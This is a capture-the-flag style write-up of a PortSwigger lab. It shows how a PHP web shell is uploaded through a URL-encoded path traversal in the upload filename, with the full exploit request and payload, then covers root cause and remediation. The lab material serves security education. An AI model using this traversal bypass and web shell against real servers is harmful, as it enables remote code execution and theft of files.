# Lab 03 — Web Shell Upload via Path Traversal

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20Filename%20Path%20Traversal-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Web Shell Upload via Path Traversal |
| **Difficulty** | Practitioner |
| **Vulnerability Class** | File Upload — Filename Path Traversal |
| **Weakness (CWE)** | CWE-22 / CWE-434: Path Traversal leading to Unrestricted Upload |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The server configures the `avatars/` directory to not execute uploaded scripts (likely via a non-executing handler mapping), but fails to sanitize path traversal sequences in the client-supplied filename. This lets an attacker write the file one directory *above* `avatars/` — into `/files/` itself — where PHP execution is not restricted.

## 3. Proof of Concept (PoC)

**Step 1 — Confirm PHP uploads aren't blocked, but also aren't executed:**  
Upload `exploit.php` as avatar — it's accepted. Requesting `GET /files/avatars/exploit.php` returns the **raw PHP source as plain text** instead of executing it, confirming that directory disables script execution.

**Step 2 — Attempt a direct traversal in the filename:**  
Capture `POST /my-account/avatar` in Repeater. In the `Content-Disposition` header, set:

```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

The response says `The file avatars/exploit.php has been uploaded` — the server appears to be stripping the `../` sequence.

**Step 3 — URL-encode the traversal sequence:**  
Obfuscate the forward slash to bypass the stripping logic:

```http
filename="..%2fexploit.php"
```

The response now reads `The file avatars/../exploit.php has been uploaded` — confirming the filename is being URL-decoded *after* the naive traversal check, and the file actually landed one level up.

**Step 4 — Trigger the shell at its true location:**  
Request:

```http
GET /files/avatars/..%2fexploit.php HTTP/1.1
```

(equivalently `GET /files/exploit.php`) — this now executes the script and returns Carlos's secret, since `/files/` does not have the same execution restriction as `/files/avatars/`.


## 4. Evidence (Request / Response)

```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------X--

GET /files/avatars/..%2fexploit.php HTTP/1.1

HTTP/1.1 200 OK
<secret-value-here>
```

## 5. Root Cause Analysis

The filename-sanitization logic strips literal `../` sequences, but runs *before* URL-decoding occurs elsewhere in the request pipeline. A URL-encoded traversal sequence (`..%2f`) passes the naive string check untouched, and is only decoded into a real `../` afterward — by which point it's too late to re-validate. This lets the attacker escape the sandboxed, non-executing `avatars/` directory entirely.

### Attacker vs. Defender Perspective

- **Attacker view:** When a directory seems to block execution, check whether the filename itself can be manipulated with (URL-encoded) traversal sequences to write outside it.
- **Defender view:** Sanitize filenames after all decoding has occurred, and apply consistent execution restrictions across the whole storage hierarchy.

## 6. Impact

Complete bypass of a directory-level execution restriction, achieving full remote code execution by writing the payload to a directory with different (less restrictive) execution rules.

## 7. Remediation

- Sanitize filenames *after* all decoding has occurred, not before, and re-validate the final resolved path.
- Reject any filename containing path separators or traversal sequences outright rather than attempting to strip them.
- Apply consistent, defense-in-depth execution restrictions across the entire upload storage hierarchy, not just the immediate target directory — a parent directory with laxer rules undermines a child directory's restriction.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
